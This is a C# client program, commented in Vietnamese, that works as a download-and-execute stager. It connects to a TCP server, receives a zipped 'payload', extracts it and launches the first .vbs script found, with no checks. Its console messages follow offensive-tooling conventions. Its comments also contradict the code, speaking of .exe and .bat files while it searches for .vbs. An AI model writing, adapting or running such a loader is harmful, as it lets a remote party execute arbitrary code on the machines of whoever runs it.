using System;
using System.IO;
using System.IO.Compression;
using System.Net.Sockets;
using System.Diagnostics;
using System.Text;

class ClientProgram
{
    static void Main()
    {
        string serverIP = "127.0.0.1";
        int serverPort = 12345;
        string extractDir = "unzipped";

        TcpClient client = null;
        NetworkStream stream = null;
        BinaryReader reader = null;
        StreamWriter writer = null;

        try
        {
            Console.WriteLine("[*] Connecting to server...");
            client = new TcpClient(serverIP, serverPort);
            stream = client.GetStream();
            reader = new BinaryReader(stream);
            writer = new StreamWriter(stream) { AutoFlush = true };

            // Đọc tên file
            int fileNameLength = reader.ReadInt32();
            byte[] nameBytes = reader.ReadBytes(fileNameLength);
            string zipFile = Encoding.UTF8.GetString(nameBytes);

            // Đọc payload
            int payloadSize = reader.ReadInt32();
            Console.WriteLine($"[+] Payload file: {zipFile} ({payloadSize} bytes)");

            if (payloadSize <= 0)
            {
                Console.WriteLine("❗ No payload received. Waiting for disconnection...");
            }
            else
            {
                byte[] buffer = new byte[payloadSize];
                int totalRead = 0;
                while (totalRead < payloadSize)
                {
                    int bytesRead = stream.Read(buffer, totalRead, payloadSize - totalRead);
                    if (bytesRead == 0) break;
                    totalRead += bytesRead;
                }

                File.WriteAllBytes(zipFile, buffer);
                Console.WriteLine($"[+] Payload saved: {zipFile}");

                if (Directory.Exists(extractDir))
                    Directory.Delete(extractDir, true);

                ZipFile.ExtractToDirectory(zipFile, extractDir);
                Console.WriteLine("[+] Payload extracted.");

                // Tìm file .exe đầu tiên trong thư mục
                // Ưu tiên tìm .bat trước
                string[] vbsFiles = Directory.GetFiles(extractDir, "*.vbs", SearchOption.AllDirectories);
                if (vbsFiles.Length > 0)
                {
                    string vbsPath = vbsFiles[0];
                    Console.WriteLine($"[*] Running {Path.GetFileName(vbsPath)}...");
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = vbsPath,
                        UseShellExecute = true,
                        WindowStyle = ProcessWindowStyle.Normal
                    });
                }

            }

            Console.WriteLine("[i] Press ENTER to exit and disconnect...");
            Console.ReadLine();

            writer.WriteLine("done");
        }
        catch (Exception ex)
        {
            Console.WriteLine("❌ Error: " + ex.Message);
        }
        finally
        {
            writer?.Close();
            reader?.Close();
            stream?.Close();
            client?.Close();
        }
    }
}
